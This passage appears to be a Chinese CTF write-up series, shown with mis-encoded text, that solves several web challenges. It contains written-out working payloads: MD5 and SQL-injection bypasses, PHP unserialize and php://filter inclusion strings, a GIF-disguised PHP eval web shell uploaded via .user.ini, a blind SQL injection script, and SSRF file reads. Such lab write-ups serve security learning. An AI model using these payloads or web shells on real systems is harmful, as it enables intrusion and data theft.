sqlç»•è¿‡ã€md5ç¢°æ’ç»•è¿‡ã€md5æ•°ç»„ç»•è¿‡ è¾“å…¥ä»€ä¹ˆéƒ½æ²¡æœ‰ä»€ä¹ˆæ˜¾ç¤ºï¼ŒæŠ“åŒ…çœ‹çœ‹ å‘ç°æç¤º select * from &#39;admin&#39; where password=md5($pass,true ç½‘ä¸ŠæŸ¥ï¼šé€ æˆmd5()æ¼æ´çš„å€¼ï¼šffifdyop ç´§æ¥ç€æŠ“åŒ…ï¼ŒæŸ¥çœ‹ å‘ç°æºç  1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; åˆ™æ„é€  1?a=240610708&amp;b=QNKCDZO æºç  123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; æ„é€ ä»¥ä¸‹å†…å®¹ï¼Œå¾—åˆ° flag 1?param1[]=0&amp;param2[]=1 md5 ç¢°æ’ 2.1 æ€»ç»“ï¼šMD5 ç»•è¿‡ sql md5 ç»•è¿‡ sql ï¼šmd5 å’Œ sha1 æ”¯æŒç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚æœä¸º trueï¼Œåˆ™ä¼šå°† hash åçš„ 16 è¿›åˆ¶å­—ç¬¦ä¸²ä»¥ 16 è¿›åˆ¶è½¬æˆå­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ï¼Œå¦‚æœåœ¨ SQL è¯­å¥ä¸­è¿™æ ·å†™ï¼Œä¼šå­˜åœ¨æ³¨å…¥çš„é—®é¢˜ã€‚ 1234567æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šffifdyopï¼Œmd5åï¼Œ276f722736c95d99e921722cf9ed621cå†è½¬æˆå­—ç¬¦ä¸²ï¼š&#x27;or&#x27;6Ã‰]â„¢Ã©!r,Ã¹Ã­bï¼Œå³md5(&#x27;ffifdyop&#x27;,true) =&#x27;or&#x27;6Ã‰]â„¢Ã©!r,Ã¹Ã­b // å¯ä»¥å®ç°ç»•è¿‡ $password = &quot;ffifdyop&quot;; $sql = &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;; var_dump($sql); ä¸‰ã€[ZJCTF 2019]NiZhuanSiWei1è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€phpä¼ªåè®®ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ– 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 123?text=data://test/plain,welcome to the zjctfæˆ–è€…æ˜¯?text=data://test/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= file å‚æ•°ä¸èƒ½å«æœ‰ flag æ„é€  1?text=data://test/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php å¾—åˆ° useless.phpçš„å†…å®¹å¦‚ä¸‹ï¼š 123456789101112&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; __tostring() æ˜¯åœ¨ç›´æ¥è¾“å‡ºå¯¹è±¡å¼•ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æºç æœ€åå¯¹passwordè¿™ä¸ªå˜é‡è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œç„¶åè¿›è¡Œè¾“å‡ºï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¯¹è±¡çš„è¯ï¼Œåœ¨å¯¹è±¡è¿›è¡Œ echo æ—¶å°±ä¼šè°ƒç”¨ __tostring() é­”æœ¯æ–¹æ³•ï¼Œè·å–åˆ° $file ä¸­çš„å†…å®¹ã€‚ 123$a = new Flag();$a-&gt;file = &quot;flag.php&quot;;echo serialize($a); å¾—åˆ° 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; æœ€ç»ˆçš„ payload 1?text=data://test/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; æŸ¥çœ‹æºç å¾—åˆ° flag å››ã€[SUCTF 2019]CheckIn1è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ã€å›¾ç‰‡æœ¨é©¬ è¿‡ &lt;?ã€.user.inié…ç½®æ–‡ä»¶çš„ä½¿ç”¨ ä¸Šä¼  .php .php2 .php3 .php5 .phtmlï¼Œå‘ç°ä¸è¢«å…è®¸ ä¿®æ”¹ Content-Type , å‘ç°ä¸èƒ½åŒ…å« &lt;? ä¿®æ”¹æ–‡ä»¶å†…å®¹ &lt;script language=&quot;php&quot;&gt;@eval($_POST[111])&lt;/script&gt; ï¼Œè¿”å› exif_imagetype:not image! åœ¨æ–‡ä»¶å†…å®¹å¼€å¤´åŠ ä¸Š GIF89aï¼Œå¾—åˆ°ä¸Šä¼ è·¯å¾„ï¼Œå‘ç° éå›¾ç‰‡ç±»å‹ è®¿é—®ä¸èƒ½ç”¨èšå‰‘è¿ä¸Š æƒ³åˆ°çš„è§£å†³åŠæ³•ï¼š.htaccess .user.ini åŒºåˆ†ï¼š .htaccess æ˜¯ ApacheæœåŠ¡å™¨çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œè¯¥é…ç½®æ–‡ä»¶ä¼šè¦†ç›– ApacheæœåŠ¡å™¨çš„å…¨å±€é…ç½® httpd-conf ï¼Œåªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ .user.ini æ˜¯ PHPçš„ç›®å½•é…ç½®æ–‡ä»¶ï¼ˆå±€éƒ¨çš„ï¼‰ï¼Œç›¸å½“äºç”¨æˆ·è‡ªå·±å®šä¹‰çš„ä¸€ä¸ª php.ini æ–‡ä»¶ã€‚ä¸ä»…ä»…é™äº Apache æœåŠ¡å™¨ï¼Œè¿˜å¯ä»¥ç”¨äº Nginx , IIS ç­‰æœåŠ¡å™¨ã€‚ æŸ¥çœ‹è¯¥é¢˜ç›®çš„æœåŠ¡å™¨ï¼šopenresty OpenRestyÂ® æ˜¯ä¸€ä¸ªæˆç†Ÿçš„ç½‘ç»œå¹³å°ï¼Œå®ƒé›†æˆäº†æˆ‘ä»¬çš„ Nginx æ ¸å¿ƒå¢å¼ºç‰ˆã€LuaJIT å¢å¼ºç‰ˆã€è®¸å¤šç²¾å¿ƒç¼–å†™çš„ Lua åº“ã€å¤§é‡é«˜è´¨é‡çš„ 3rd-party Nginx æ¨¡å—ä»¥åŠå®ƒä»¬çš„å¤§éƒ¨åˆ†å¤–éƒ¨ä¾èµ–é¡¹ã€‚ åªèƒ½ä½¿ç”¨ .user.ini ï¼Œå¹¶ä¸”ç»“åˆè¯¥æ–¹æ³•çš„ä½¿ç”¨æ¡ä»¶ï¼Œè¯¥ç›®å½•ä¸‹å¿…é¡»å«æœ‰ .php æ–‡ä»¶ï¼Œä¸‹é¢çš„å›¾ç‰‡ä¸­å¯ä»¥çœ‹åˆ°è¯¥é¢˜ç›®ä¸­å«æœ‰ index.php æ–‡ä»¶ ç¼–å†™ .user.ini æ–‡ä»¶å¹¶ä¸Šä¼  12GIF89a auto_prepend_file=.hack_GIF_ma.gif ç¼–å†™ hack_GIF_ma.gif æ–‡ä»¶å¹¶ä¸Šä¼  123Content-Type:image/gifæ–‡ä»¶åï¼šhack_GIF_ma.gifæ–‡ä»¶å†…å®¹ï¼šGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_GET[&quot;cmd&quot;])&lt;/script&gt; å¯ä»¥çœ‹åˆ°ç»™æˆ‘ä»¬å›æ˜¾çš„å†…å®¹æ˜¯æˆ‘ä»¬æˆåŠŸä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ï¼Œä»¥åŠå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç° index.php è®¿é—® index.php 123/uploads/79d126728819a4f553622db4444bccf9/index.php?cmd=var_dump(scandir(&#x27;/&#x27;));/uploads/79d126728819a4f553622db4444bccf9/index.php?cmd=system(&#x27;cat /flag&#x27;); 4.1 æ€»ç»“ï¼šæ£€æŸ¥æ˜¯å¦æ˜¯å›¾ç‰‡ å‡½æ•°123456789exif_imagetype ( string $filename ) : int 1. åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹ 2. è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚ 3. å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„é¢„å®šä¹‰å¸¸é‡ï¼Œå¦åˆ™è¿”å› falseã€‚ getimagesize ( string $filename , array &amp;$imageinfo = ? ) : array â€” å–å¾—å›¾åƒå¤§å° 1. å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹å’Œä¸€ä¸ªå¯ä»¥ç”¨äºæ™®é€š HTML æ–‡ä»¶ä¸­ IMG æ ‡è®°ä¸­çš„ height/width æ–‡æœ¬å­—ç¬¦ä¸² 2. å¦‚æœä¸èƒ½è®¿é—® filename æŒ‡å®šçš„å›¾åƒæˆ–è€…å…¶ä¸æ˜¯æœ‰æ•ˆçš„å›¾åƒï¼Œgetimagesize() å°†è¿”å› false å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ã€‚ äº”ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1è€ƒç‚¹ï¼šSQL æ³¨å…¥ ä¹‹ ç»• = ï¼Œå›æ˜¾ä¸å®Œå…¨ æš´åº“ï¼š ç©ºæ ¼ã€andã€#ã€--+ã€&amp;&amp;ã€selectã€unionã€orderã€byã€| ç­‰ éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ‰ orï¼Œå¹¶ä¸”æœ‰æŠ¥é”™ï¼Œå­—ç¬¦å‹æ³¨å…¥ï¼Œå•å¼•å·é—­åˆ 123a&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;a&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or&#x27;# æ•°æ®åº“ geek æš´è¡¨ï¼šè¿‡æ»¤ ç©ºæ ¼ã€= 12a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;# è¡¨ H4rDsq1 æŸ¥åˆ—ï¼š 12a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;# åˆ— id,username,password æŸ¥æ•°æ®ï¼š 123456789a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(concat_ws(&#x27;~&#x27;,username,password)))from(geek.H4rDsq1)),0x7e),1))or&#x27;# flag æŸ¥ä¸å®Œå…¨ï¼Œä½¿ç”¨ substr()å‡½æ•°ï¼Œè¢«è¿‡æ»¤ï¼Œä½¿ç”¨ mid()ï¼Œè¢«è¿‡æ»¤ï¼Œä½¿ç”¨# left() å’Œ right() a&#x27;or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1)),0x7e),1))or&#x27; a&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))or&#x27; #å¾—åˆ° flag 5.1 æ€»ç»“æŸ¥ä¸å®Œå…¨æ—¶å¯ä½¿ç”¨çš„å‡½æ•°ï¼š substr() left() right() substring() mid() å½“ æ¡ä»¶ å½“ä¸­çš„ = è¢«è¿‡æ»¤æ—¶ï¼Œä½¿ç”¨ like å…­ã€[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World1è€ƒç‚¹ï¼šSQLæ³¨å…¥ ä¹‹ ç›²æ³¨ è¿‡æ»¤äº†ç©ºæ ¼ã€/**/ã€andã€#ã€orã€æ²¡æœ‰è¿‡æ»¤ |ã€&amp; 1åœ¨åˆ¤æ–­æ•°å€¼å‹å’Œå­—ç¬¦ä¸²æ³¨å…¥æ—¶è¿˜å¯ä»¥é€šè¿‡æäº¤æ•°å­¦å¼çš„æ–¹å¼æ¥åˆ¤æ–­ï¼Œå¦‚æäº¤&#x27;id=2/2&#x27;ï¼Œå¦‚æœå­—ç¬¦å‹åˆ™è¿”å›id=2çš„ç»“æœï¼Œå¦‚æœæ˜¯æ•°å€¼å‹åˆ™è¿”å›id=1çš„ç»“æœã€‚ æ•°å­—å‹æ³¨å…¥ 1åˆ©ç”¨/*!union*/å¯ä»¥ç»•è¿‡å¯¹unionçš„è¿‡æ»¤ æ–°çš„ç›²æ³¨æ‰‹æ³•ï¼š 12#ä¾‹å¦‚ï¼šselect * from users where id=(length(database())&gt;3); ç›²æ³¨è„šæœ¬ 123456789101112131415161718192021import requestsimport timeimport reurl=&#x27;http://d0e648d5-1dd9-4eac-86c5-4dd5c8516203.node3.buuoj.cn/index.php&#x27;flag = &#x27;&#x27;for i in range(1,43): max = 127 min = 0 for c in range(0,127): s = (int)((max+min)/2) payload = &#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;+str(i)+&#x27;,1))&gt;&#x27;+str(s)+&#x27;)&#x27; r = requests.post(url,data = &#123;&#x27;id&#x27;:payload&#125;) time.sleep(0.005) if &#x27;Hello, glzjin wants a girlfriend.&#x27; in str(r.content): max=s else: min=s if((max-min)&lt;=1): flag+=chr(max) breakprint(flag) ä¸ƒã€[ç½‘é¼æ¯ 2018]Fakebook1è€ƒç‚¹ï¼šSQL æ³¨å…¥ + SSRF + åºåˆ—åŒ–ä¸ååºåˆ—åŒ– Join ä¸€ä¸‹ï¼ŒBlog å¿…é¡»æ˜¯ é“¾æ¥ç±»å‹çš„ï¼Œå‚ä¸æˆåŠŸä¹‹åå» Login ä¸€ä¸‹ï¼Œè¿›å…¥åˆ°ä¸ªäººçš„åšå®¢ç•Œé¢ï¼Œå‘ç°URLå‘ç”Ÿå˜åŒ–ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ æ•°å­—å‹æ³¨å…¥ï¼Œè¿‡æ»¤äº† union selectï¼Œ/**/ ç»•è¿‡ 12345678910111213141516171819201#1 order by 4#1 union/**/select 1,2,3,4#-1 union/**/select 1,database(),3,4## æ•°æ®åº“ fakebook -1 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;fakebook&#x27;),3,4## è¡¨ users -1 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;fakebook&#x27;),3,4## åˆ— no,username,passwd,data -1 union/**/select 1,(select group_concat(concat_ws(&#x27;~&#x27;,username,passwd)) from fakebook.users),3,4## æŸ¥åˆ°çš„æ˜¯åˆšåˆšç”¨æˆ·æ·»åŠ çš„è´¦å·ä»¥åŠå¯†ç ï¼Œæ²¡æœ‰ç®¡ç†å‘˜çš„-1 union/**/select 1,(select group_concat(no) from fakebook.users),3,4## 1,2-1 union/**/select 1,(select group_concat(data) from fakebook.users),3,4##å†…å®¹å¦‚ä¸‹ æŸ¥åˆ°çš„ data å†…å®¹å¦‚ä¸‹ï¼Œæ˜¯åˆšåˆšæˆ‘æ³¨å†Œçš„è´¦å·è¿›è¡Œåºåˆ—åŒ–ä¹‹åçš„å†…å®¹ 1O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;xi&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;xi.com&quot;;&#125;,O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;qq&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;xi.com&quot;;&#125; å­˜åœ¨ robots.txt ä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œæºç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php class UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; //åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„cURLä¼šè¯å¹¶è·å–ä¸€ä¸ªç½‘é¡µ function get($url) &#123; //åˆå§‹åŒ–ä¸€ä¸ª curlä¼šè¯ï¼Œå³åˆ›å»ºä¸€ä¸ªæ–°çš„ curl èµ„æº $ch = curl_init(); //è®¾ç½® URLå’Œç›¸åº”çš„é€‰é¡¹ curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //æ‰§è¡Œ curlä¼šè¯ï¼Œå³æŠ“å–URLå¹¶å°†å®ƒä¼ é€’ç»™æµè§ˆå™¨ $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; //å…³é—­Curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; æµç¨‹ï¼šå½“ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–°çš„è´¦å·æ—¶ï¼Œå°±è¾“å…¥äº†ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬Blogï¼Œå®ƒè¢«è¦æ±‚æ˜¯ä¸€ä¸ªé“¾æ¥ï¼Œå¹¶ä¸”ä»ä¸Šé¢çš„æºç å½“ä¸­å¯ä»¥çœ‹åˆ°å®ƒçš„å€¼æ˜¯åšäº†ä¸€äº›è¿‡æ»¤çš„ï¼Œå½“ç”¨æˆ·æˆåŠŸç™»é™†è¿‘æœŸä¹‹åï¼Œç‚¹å‡»è‡ªå·±çš„åšå®¢é“¾æ¥ä¼šçœ‹åˆ°ç”¨æˆ·æœ€å¼€å§‹æ‰€è¾“å…¥çš„ä¿¡æ¯å†…å®¹ï¼Œä»¥ä¸‹å›¾çš„æ–¹å¼æ˜¾ç¤ºã€‚ ç„¶å get($url) å‡½æ•°å°†æˆ‘ä»¬çš„é¡µé¢ä¼ ç»™æµè§ˆå™¨ï¼Œå³å­˜åœ¨ SSRFï¼› è€Œæˆ‘ä»¬è¿›è¡ŒSQLæ³¨å…¥ä¹‹åå‘ç°çš„ data æ•°æ®å¾ˆæ˜¾ç„¶æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯å†…å®¹è¿›è¡Œåºåˆ—åŒ–ä¹‹åä¿å­˜çš„ï¼Œå¯ä»¥ç†è§£ä¸ºï¼šå®ƒå°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯è¿›è¡Œåºåˆ—åŒ–å­˜å‚¨åˆ°æ•°æ®åº“çš„dataå­—æ®µä¸­ï¼Œè€Œååˆè¿›è¡Œååºåˆ—åŒ–æ‰å°†å†…å®¹æ˜¾ç¤ºåˆ°æµè§ˆå™¨çš„é¡µé¢å½“ä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œè§£æ å¯¹è¯¥é¡µé¢æºç æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå®ƒå°†æˆ‘ä»¬çš„Blogå†…å®¹ä¼ åˆ°äº† &lt;iframe&gt; ä¸­ï¼Œ æ„é€  1-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;xi&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;# æŸ¥çœ‹æºç ä¹‹åï¼Œç‚¹å‡»é“¾æ¥è·å¾— flag **å¦ä¸€ç§è§£æ³•ï¼šæ²¡æœ‰è¿‡æ»¤ load_file() ** 1-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4# 7.1 æ€»ç»“ï¼šMysql å¯¹æ–‡ä»¶çš„æ“ä½œ load_file() load data infile() system cat ä½¿ç”¨æ¡ä»¶ï¼š1. æœ‰Fileæƒé™ï¼ˆFile_privçš„å€¼ï¼‰ï¼›2. secure_file_priv çš„å€¼ä¸ä¸º NULL æ³¨ï¼š&gt;=5.7.16é»˜è®¤å€¼ä¸ºNULLï¼Œ&lt;5.7.16åˆ™ä¸ºç©º 12#æŸ¥çœ‹ File_privselect File_priv from mysql.user where user=&#x27;root&#x27; and host =&#x27;localhost&#x27;; 12345678910#æŸ¥çœ‹ secure_file_privshow global variables like &quot;secure_file_priv&quot;;å€¼æ˜¯ NULL --- ä¸å…è®¸æ–‡ä»¶å¯¼å…¥å¯¼å‡ºæ“ä½œå€¼æ˜¯ ç©º --- ä¸å¯¹mysqlçš„å¯¼å…¥å¯¼å‡ºæ“ä½œåšå‡ºé™åˆ¶å€¼æ˜¯ å…·ä½“è·¯å¾„ é™åˆ¶mysqlçš„å¯¼å…¥ä¸å¯¼å‡ºæ“ä½œé™åˆ¶åœ¨æŒ‡å®šè·¯å¾„ä¸‹#ä¿®æ”¹# Windows ä¸‹ä¿®æ”¹ mysql.ini æ–‡ä»¶ ï¼ˆsecure_file_priv =ï¼‰# Linux ä¸‹åœ¨/etc/my.cnfçš„[mysqld]ä¸‹é¢æ·»åŠ local-infile=0é€‰é¡¹ è¯»å–æ–‡ä»¶ 12345678# load_file()select load_file(&#x27;D:/test.txt&#x27;);# load data infile()# åˆ©ç”¨è¯¥å‡½æ•°è¯»æ–‡ä»¶æ—¶éœ€è¦å°†æ–‡ä»¶å†…å®¹ä¿å­˜è‡³ä¸€ä¸ªè¡¨ä¸­create table test(content text);load data infile &#x27;D:\\\\test.txt&#x27; into table test;select * from test; å†™å…¥æ–‡ä»¶ 1select * into outfile &#x27;D:\\\\users.txt&#x27; from users; å…«ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1è€ƒç‚¹ï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œprivateã€publicã€protected åºåˆ—åŒ–åŒºåˆ« 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; åˆ†æï¼š 12345671.?strä¼ å‚ï¼Œå¦‚æœå‚æ•°æ»¡è¶³is_valid($s)æ¡ä»¶ï¼Œå°†ä¼šä½¿ç”¨ unserialize($str)ï¼Œç´§æ¥ç€å°†è§¦å‘ __destruct()é­”æœ¯æ–¹æ³•2.åˆ¤æ–­ opå€¼ï¼Œå¦‚æœæ˜¯2çš„è¯ï¼Œå°†å¼ºåˆ¶è½¬æ¢ä¸º13.è°ƒç”¨ process()å‡½æ•°4.opå€¼ä¸º1å°†å†™æ–‡ä»¶ï¼›å€¼ä¸º2å°†è¯»å–æ–‡ä»¶å†…å®¹5.å¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ä¹Ÿå°†ä¼šä»ç¬¬ä¸‰æ­¥å¼€å§‹6.æˆ‘ä»¬éœ€è¦è¯»å–åˆ° flag.php æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå½“ä¼ å…¥å‚æ•°stræ—¶å°±éœ€è¦ç»•è¿‡å¯¹op===2çš„æ£€æµ‹ï¼ˆæ–¹æ³•æ˜¯ï¼šop=ç©ºæ ¼2 æˆ–è€…æ˜¯ op=æ•°å­—2ï¼‰ï¼Œè¿™æ ·å³æ»¡è¶³äº†op!===&quot;2&quot; ä½† op==&quot;2&quot;7.è¿™æ ·å°±æˆåŠŸè¿›å…¥åˆ°äº† read()å‡½æ•°ï¼šå°†ä¼šä½¿ç”¨ file_get_contents($this-&gt;filename)è¿›è¡Œæ–‡ä»¶çš„è¯»å– æ„é€ ï¼š 123456789101112131415161718192021222324&lt;?php class FileHandler &#123; protected $op = 2; protected $filename = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;; protected $content; &#125;$a = new FileHandler();echo serialize($a);?&gt;# protected å¾—åˆ°ï¼šO:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;#ä¸å¯ç›´æ¥ä½¿ç”¨#php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicä¾¿å¯ç»•è¿‡# public (ä½¿ç”¨php://filter) å¾—åˆ°ï¼šO:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;# public ä¸ä½¿ç”¨ (php://filter) æŸ¥çœ‹æºç å¯è·å¾— flag ï¼š# O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; # urlencode() (ä¸ä½¿ç”¨ php://filter) å¾—åˆ°ï¼šO%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D#å°†å…¶ä¸­çš„ %00 æ¢æˆ \\00ï¼Œs æ¢æˆ S 8.1 æ€»ç»“ï¼šAscii ç çš„å¯æ‰“å°å­—ç¬¦ä¸ä¸å¯æ‰“å°å­—ç¬¦ASCIIï¼ˆAmerican Standard Code for Information Interchangeï¼Œç¾å›½ä¿¡æ¯äº’æ¢æ 